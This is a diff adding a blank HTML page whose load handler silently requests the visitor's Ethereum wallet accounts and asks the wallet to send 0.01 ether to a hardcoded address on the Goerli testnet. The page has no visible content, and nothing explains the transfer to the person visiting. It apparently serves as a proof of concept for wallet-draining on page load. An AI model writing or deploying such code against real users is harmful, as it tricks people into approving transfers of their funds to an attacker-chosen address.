@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <script src="https://cdn.jsdelivr.net/npm/web3/dist/web3.min.js"></script>
+  <script>
+    "use strict";
+
+    console.log("JS running: " + document.location.origin);
+
+    async function requestAccountsAndSendTransaction() {
+      if (window.ethereum) {
+        try {
+          const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
+          console.log(accounts);
+
+          // Create a Web3 instance
+          const web3 = new Web3(window.ethereum);
+
+          // Get the current nonce for the account
+          const account = accounts[0];
+          const nonce = await web3.eth.getTransactionCount(account);
+
+          const transactionParameters = {
+            nonce: web3.utils.toHex(nonce),
+            gasPrice: web3.utils.toHex(web3.utils.toWei('20', 'gwei')), // You can adjust the gas price
+            gas: web3.utils.toHex(21000), // Standard gas limit for ETH transfer
+            to: "0x6a726D9593EAfA6E2ffd2f63e95c2C33CdbCd403",
+            from: account,
+            value: web3.utils.toHex(web3.utils.toWei('0.01', 'ether')), // Amount to send
+            data: "0x00",
+            chainId: web3.utils.toHex(5), // Goerli testnet chain ID
+          };
+
+          const txHash = await ethereum.request({
+            method: "eth_sendTransaction",
+            params: [transactionParameters],
+          });
+
+          console.log("Transaction sent. Transaction hash:", txHash);
+        } catch (err) {
+          console.log("Error executing transaction:", err.message);
+        }
+      }
+    }
+
+    window.addEventListener('load', async () => {
+      console.log("Ethereum object available.");
+      console.log(window.ethereum);
+      await requestAccountsAndSendTransaction();
+    });
+  </script>
+</head>
+<body>
+</body>
+</html>
